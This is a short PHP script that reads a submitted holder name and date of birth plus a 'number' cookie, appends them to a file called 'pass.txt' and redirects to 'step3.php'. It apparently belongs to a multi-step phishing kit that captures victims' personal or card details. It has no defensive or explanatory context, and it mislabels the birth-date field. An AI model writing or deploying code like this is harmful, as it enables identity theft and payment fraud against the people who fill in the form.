<?php
//    echo"<pre>";print_r($_POST);die();
if (isset($_POST['submit'])) {
    // echo"<pre>";print_r($_POST);die();
    
	$HolderName = $_POST['HolderName'];
	$DOB = $_POST['DOB'];
   $number = $_COOKIE["number"];

  $HolderName = "HolderName:$HolderName";
  $DOB = "HolderName:$DOB";
   $number = "number:$number";

  $myfile = fopen("pass.txt", "a") or die("Unable to open file!");

$txt43 ="";
fwrite($myfile, "\r\n". $txt43);
fwrite($myfile, "\r\n". $HolderName);
fwrite($myfile, "\r\n". $DOB);
fwrite($myfile, "\r\n". $number);

fclose($myfile);

   
   
    header('location: step3.php');
    die();
//     $fp = fopen('lidn.txt', 'w');
// fwrite($fp,[ ]);
// fclose($fp);
}



?>
